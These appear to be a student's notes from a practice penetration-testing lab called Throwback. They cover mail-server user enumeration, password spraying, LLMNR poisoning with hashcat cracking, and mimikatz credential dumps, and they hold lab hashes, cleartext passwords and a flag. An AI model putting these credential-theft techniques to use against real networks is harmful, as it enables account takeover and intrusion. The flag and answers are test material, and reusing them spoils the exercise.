`On TB-MAIL server  - 10.200.53.232`  SQuirellMail is used 
```
full_name=BoJack Horseman
email_address=HorsemanB@throwback.local

full_name=Jeff Davies
email_address=DaviesJ@throwback.local

full_name=Fredrick Murphy
email_address=MurphyF@throwback.local

email_address=murphyf@throwback.local
reply_to=murphyf@throwback.local

full_name=noreply
email_address=noreply@throwback.local

full_name=Spooks
email_address=spopy@throwback.local
reply_to=spopy@throwback.local

DaviesJ|J|Davies|DaviesJ@throwback.local|
GongoH|Hugh |Gongo|GongoH@throwback.local|
SummersW|Summers|Winters|SummersW@throwback.local|
BlaireJ|J|Blaire|BlaireJ@throwback.local|
DaibaN|Nana|Daiba|DaibaN@throwback.local|
HorsemanB|BoJack|Horseman|HorsemanB@throwback.local|
MurphyF|Frank|Murphy|MurphyF@throwback.local|
PeanutbutterM|Mr|Peanutbutter|PeanutbutterM@throwback.local|
HumphreyW|W|Humphrey|HumphreyW@throwback.local|
JeffersD|D|Jeffers|JeffersD@throwback.local|
PetersJ|Jon|Peters|PetersJ@throwback.local|
FoxxR|Rikka|Foxx|FoxxR@throwback.local|
noreply|noreply|noreply|noreply@throwback.local|TBH{4060a70860f0a1648e5a991de1739888}


full_name=Throwback Hacks Guest
email_address=tbhguest@throwback.local
```


On mail server, we got access to MurphyF
![[Pasted image 20220926061325.png]]


Some of the valid usernames and passwords we got were (from the MAIL server):
```
PeanutButterM : Summer2020
GongoH : Summer2020
JeffersD : Summer2020
MurphyF : Summer2020
DaviesJ : Management2018
```


# We get the NTLMv2 hashes by LLMNR posioning
![[Pasted image 20220930061833.png]]
- Using hashcat we crack the hashes! (Answer - Throwback317)


## From mimikatz using admin-petersj by running commands we get the following logon passwords

1. BlaireJ
```
Authentication Id : 0 ; 178626 (00000000:0002b9c2)
Session           : Batch from 0
User Name         : BlaireJ
Domain            : THROWBACK
Logon Server      : THROWBACK-DC01
Logon Time        : 10/7/2022 6:30:57 PM
SID               : S-1-5-21-3906589501-690843102-3982269896-1116
	msv :	
	 [00000003] Primary
	 * Username : BlaireJ
	 * Domain   : THROWBACK
	 * NTLM     : c374ecb7c2ccac1df3a82bce4f80bb5b
	 * SHA1     : 6522277853426f24275c4c0b0381458ef452e640
	 * DPAPI    : db241bce607cacb4b04d032e25071f0f

Username : BlaireJ
	 * Domain   : THROWBACK
	 * Password : (null)
	kerberos :	
	 * Username : BlaireJ
	 * Domain   : THROWBACK.LOCAL
	 * Password : 7eQgx6YzxgG3vC45t5k9

```

2. PetersJ
```
Authentication Id : 0 ; 383344 (00000000:0005d970)
Session           : RemoteInteractive from 2
User Name         : petersj
Domain            : THROWBACK
Logon Server      : THROWBACK-DC01
Logon Time        : 10/7/2022 6:33:51 PM
SID               : S-1-5-21-3906589501-690843102-3982269896-1202
	msv :	
	 [00000003] Primary
	 * Username : PetersJ
	 * Domain   : THROWBACK
	 * NTLM     : b81e7daf21f66ff3b8f7c59f3b88f9b6
	 * SHA1     : c0c2f57355e44b7fadbfe9921537d452133997f4
	 * DPAPI    : 3bf226ffb12ebe58a21b1a5758072047
	tspkg :	
	wdigest :	
	 * Username : PetersJ
	 * Domain   : THROWBACK
	 * Password : (null)
	kerberos :	
	 * Username : petersj
	 * Domain   : THROWBACK.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	 [00000000]
	 * Username : admin-petersj
	 * Domain   : localadmin.pass
	 * Password : SinonFTW123!
	 [00000001]
	 * Username : THROWBACK-PROD\admin-petersj
	 * Domain   : THROWBACK-PROD\admin-petersj
	 * Password : SinonFTW123!
```

3. Administrator
```
Authentication Id : 0 ; 76210 (00000000:000129b2)
Session           : Batch from 0
User Name         : Administrator
Domain            : THROWBACK-PROD
Logon Server      : THROWBACK-PROD
Logon Time        : 10/7/2022 6:30:44 PM
SID               : S-1-5-21-1142397155-17714838-1651365392-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : THROWBACK-PROD
	 * NTLM     : a06e58d15a2585235d18598788b8147a
	 * SHA1     : 4e40938facb10fb6aa244240301b791a0454f328
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : THROWBACK-PROD
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : THROWBACK-PROD
	 * Password : (null)
	ssp :	
	credman :	
	 [00000000]
	 * Username : admin-petersj
	 * Domain   : THROWBACK-PROD
	 * Password : SinonFTW123!
	 [00000001]
	 * Username : admin-petersj
	 * Domain   : Login
	 * Password : SinonFTW123!
	 [00000002]
	 * Username : THROWBACK-PROD\admin-petersj
	 * Domain   : THROWBACK-PROD\admin-petersj
	 * Password : SinonFTW123!


```

- Here we found NTLM hashes for different users as well as cleartext passwords too!
![[Pasted image 20221008004113.png]]
